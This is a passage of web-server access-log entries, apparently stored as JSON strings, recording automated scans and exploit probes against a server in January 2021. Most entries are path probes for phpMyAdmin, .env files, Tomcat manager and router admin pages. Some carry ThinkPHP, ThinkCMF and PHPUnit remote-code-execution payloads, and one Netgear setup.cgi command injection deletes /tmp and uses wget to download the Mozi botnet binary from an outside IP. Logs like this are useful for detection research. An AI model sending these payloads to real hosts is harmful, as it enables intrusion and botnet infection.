            "127.0.0.1 - - [29/Jan/2021:10:57:43 +0000] \"GET /english/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:11:59:50 +0000] \"GET /solr/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:36:25 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:36:25 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:36:25 +0000] \"GET /thinkphp/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:36:25 +0000] \"GET /html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:36:26 +0000] \"GET /public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:36:26 +0000] \"GET /TP/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:36:26 +0000] \"GET /elrekt.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:36:26 +0000] \"GET /index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:38:59 +0000] \"GET /w00tw00t.at.blackhats.romanian.anti-sec:%29 HTTP/1.0\" 404 232 \"-\" \"ZmEu\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:38:59 +0000] \"GET /phpMyAdmin/scripts/setup.php HTTP/1.0\" 404 232 \"-\" \"ZmEu\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:35 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:35 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:35 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:35 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:36 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:36 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:36 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:37 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:37 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:12:45:37 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:13:11:33 +0000] \"POST /GponForm/diag_Form?images%2F= HTTP/1.0\" 404 232 \"-\" \"Hello, World\"\n",
            "127.0.0.1 - - [29/Jan/2021:14:08:20 +0000] \"GET /manager/text/list HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 zgrab/0.x\"\n",
            "127.0.0.1 - - [29/Jan/2021:14:48:02 +0000] \"GET /phpmyadmin/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:14:48:02 +0000] \"GET /pmd/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:14:48:02 +0000] \"GET /pmd/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:16:05:49 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:16:05:50 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - MCaId1VV [29/Jan/2021:16:05:50 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:16:50:39 +0000] \"GET /aaa9 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:16:50:41 +0000] \"GET /aab9 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:18:01:13 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:18:01:13 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - mNQC4qHG [29/Jan/2021:18:01:13 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:18:46:17 +0000] \"GET /.env HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:18:46:18 +0000] \"POST / HTTP/1.0\" 405 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n",
            "127.0.0.1 - - [29/Jan/2021:19:33:28 +0000] \"GET /setup.cgi?cmd=rm+-rf+%2Ftmp%2F%2A&curpath=%2F&currentsetting.htm=1&next_file=netgear.cfg&sh+netgear=&todo=syscmd&wget+http%3A%2F%2F119.36.24.104%3A50540%2FMozi.m+-O+%2Ftmp%2Fnetgear= HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:20:32:54 +0000] \"GET /swagger HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
            "127.0.0.1 - - [29/Jan/2021:20:47:08 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:20:47:08 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - Tf0rB6VG [29/Jan/2021:20:47:09 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [29/Jan/2021:20:52:03 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [29/Jan/2021:21:53:40 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
            "127.0.0.1 - - [30/Jan/2021:00:32:02 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [30/Jan/2021:00:32:47 +0000] \"GET /english/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:00:59:37 +0000] \"GET /webfig/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:01:38:15 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:01:38:16 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - V9AQlcwo [30/Jan/2021:01:38:16 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:01:31 +0000] \"GET /ok.txt HTTP/1.0\" 404 232 \"-\" \"python-requests/2.25.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:12 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:12 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:13 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:13 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:14 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:14 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:14 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:14 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:15 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:03:57:15 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:05:25:07 +0000] \"GET /boaform/admin/formLogin?psd=ec8&username=ec8 HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:06:54:18 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:06:54:19 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - Rno3gdMw [30/Jan/2021:06:54:19 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:09:10:35 +0000] \"GET /0bef HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:10:08:56 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
            "127.0.0.1 - - [30/Jan/2021:11:12:30 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [30/Jan/2021:11:12:30 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [30/Jan/2021:11:46:22 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [30/Jan/2021:14:40:14 +0000] \"GET /.env HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:14:40:16 +0000] \"POST / HTTP/1.0\" 405 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n",
            "127.0.0.1 - 0YOOYERe [30/Jan/2021:15:58:20 +0000] \"GET /manager/html/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:31 +0000] \"GET /phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:31 +0000] \"GET /phpMyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:31 +0000] \"GET /phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:32 +0000] \"GET /phpmyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:32 +0000] \"GET /mysql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:32 +0000] \"GET /database/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:33 +0000] \"GET /phpmyadmin1/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:33 +0000] \"GET /phpmyadmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:33 +0000] \"GET /phpmyadmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:34 +0000] \"GET /phpmyadmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:34 +0000] \"GET /phpmyadmin5/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:34 +0000] \"GET /phpMyAdmin1/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:35 +0000] \"GET /phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:35 +0000] \"GET /phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:36 +0000] \"GET /phpMyAdmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:36 +0000] \"GET /phpMyAdmin5/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:36 +0000] \"GET /mysql/admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:37 +0000] \"GET /mysql/dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:37 +0000] \"GET /mysql/sqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:37 +0000] \"GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:38 +0000] \"GET /2phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:38 +0000] \"GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:38 +0000] \"GET /phpmy/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:39 +0000] \"GET /phppma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:39 +0000] \"GET /myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:39 +0000] \"GET /shopdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:40 +0000] \"GET /MyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:40 +0000] \"GET /program/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:41 +0000] \"GET /PMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:41 +0000] \"GET /dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:41 +0000] \"GET /pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:42 +0000] \"GET /db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:42 +0000] \"GET /admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:42 +0000] \"GET /db/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:43 +0000] \"GET /db/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:43 +0000] \"GET /sqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
